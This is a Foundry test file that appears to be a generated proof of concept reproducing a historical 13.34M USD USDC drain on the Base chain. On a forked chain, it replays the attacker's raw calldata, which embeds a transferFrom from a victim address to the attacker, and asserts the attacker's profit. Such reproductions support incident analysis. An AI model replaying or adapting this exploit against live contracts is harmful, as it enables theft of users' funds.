// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./Base.sol";

// @KeyInfo - Total Lost : 13.34M USD
// Attacker : 0x6caad74121bf602e71386505a4687f310e0d833e
// Attack Contract : 0xcce2e1a23194bd50d99eb830af580df0b7e3225b
// Vulnerable Contract : N/A
// Attack Tx : 0xc15df1d131e98d24aa0f107a67e33e66cf2ea27903338cc437a3665b6404dd57
// Block : 41289841
// Chain : Base
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : attacker_profit_reproduction
// Reproduced Value : 13.34M USD
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 41289840;
    uint256 constant TX_TIMESTAMP = 1769369029;
    uint256 constant TX_BLOCK_NUMBER = 41289841;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttackContrac();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttackContrac() internal returns (OurAttack attack) {
        _installRuntimeFallb();
        attack = OurAttack(payable(ATTACK_CONTRACT));
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _expectedAttackChild(OurAttack attack) internal view returns (address) {
        attack;
        return address(0);
    }

    function _installRuntimeFallb() internal {
        // Exact-address fallback for observed CREATE/CREATE2 and callback surfaces.
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.setNonce(ATTACK_CONTRACT, 1);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.USDC, "USDC", 13342433169249);
    }
}

contract OurAttack {
    constructor() payable {}

    function attack() external payable {
        _setup();
    }

    function _setup() public {
        _replayProtocolCalls();
    }

    function _replayProtocolCalls() internal {
        IERC20Like(Addresses.USDC).balanceOf(Addresses.A_BA15E9_78ED);
        IERC20Like(Addresses.USDC).allowance(Addresses.A_BA15E9_78ED, Addresses.A_616000_757E);
        {
            bytes memory observedCallData =
                hex"8739554000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000160000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000c5fecc3a29fb57b5024eec8a2239d4621e111cbe00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c5fecc3a29fb57b5024eec8a2239d4621e111cbe000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000833589fcd6edb6e08f4c7c32d4f71b54bda02913000000000000000000000000000000000000000000000000000000000000001c00000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000000000006423b872dd000000000000000000000000ba15e9b644685cb845af18a738abd40c6bcd78ed0000000000000000000000006caad74121bf602e71386505a4687f310e0d833e00000000000000000000000000000000000000000000000000000c2286fd4f6100000000000000000000000000000000000000000000000000000000"; // artifact calldata preserved: unknown selector 0x87395540; preserving raw calldata without inventing a name; pseudocode raw_call action_0002 line 229 requires exact artifact calldata
            (bool ok,) = Addresses.A_616000_757E.call(observedCallData);
            require(ok, "observed unknown selector 0x87395540 failed");
        }
        IERC20Like(Addresses.USDC).balanceOf(Addresses.attacker_eoa);
    }

    receive() external payable {}

    fallback() external payable {
        if (msg.data.length == 0) return;
        _entryCb();
    }

    function _entryCb() internal {}

    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _tryHelperAt(address target, bytes memory data) internal {
        (bool ok,) = target.call(data);
        ok;
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant FiatTokenV2_2 = 0x2Ce6311ddAE708829bc0784C967b7d77D19FD779; // Addresses.FiatTokenV2_2 = 0x2ce6311ddae708829bc0784c967b7d77d19fd779 label=FiatTokenV2_2 roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant A_616000_757E = 0x616000e384Ef1C2B52f5f3A88D57a3B64F23757e; // Addresses.A_616000_757E = 0x616000e384ef1c2b52f5f3a88d57a3b64f23757e label=unresolved roles=observed_address|recipient|sender|storage_contract source=unresolved confidence=low
    address internal constant attacker_eoa = 0x6cAad74121bF602e71386505A4687f310e0D833e; // Addresses.attacker_eoa = 0x6caad74121bf602e71386505a4687f310e0d833e label=attacker_eoa roles=attacker_eoa|contract|economic_holder|observed_address|profit_holder|recipient|sender source=tx_metadata.from confidence=high
    address internal constant USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913; // Addresses.USDC = 0x833589fcd6edb6e08f4c7c32d4f71b54bda02913 label=FiatTokenProxy token_symbol=USDC roles=asset|contract|economic_asset|observed_address|profit_asset|recipient|storage_contract|token_related source=etherscan_v2 confidence=high
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8; // Addresses.BalancerVault = 0xba12222222228d8ba445958a75a0704d566bf2c8 label=BalancerVault roles=known_protocol source=poc_sketch.known_addresses confidence=high
    address internal constant A_BA15E9_78ED = 0xba15E9b644685cB845aF18a738Abd40C6Bcd78eD; // Addresses.A_BA15E9_78ED = 0xba15e9b644685cb845af18a738abd40c6bcd78ed label=unresolved roles=observed_address|recipient|sender source=unresolved confidence=low
    address internal constant A_1INCH = 0xc5fecC3a29Fb57B5024eEc8a2239d4621e111CBE; // Addresses.A_1INCH = 0xc5fecc3a29fb57b5024eec8a2239d4621e111cbe label=unresolved token_symbol=1INCH roles=asset|contract|observed_address|recipient source=unresolved confidence=low
    address internal constant attack_contract = 0xcCE2E1a23194bD50d99eB830af580Df0B7e3225b; // Addresses.attack_contract = 0xcce2e1a23194bd50d99eb830af580df0b7e3225b label=attack_contract roles=attacker_contract|attacker_entry_contract|code_contract|contract|localized_contract|observed_address|sender|storage_contract source=localize.localized_call_graph confidence=high
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF; // Addresses.A_FFFFFF_FFFF = 0xffffffffffffffffffffffffffffffffffffffff label=unresolved roles=observed_address source=unresolved confidence=low
}

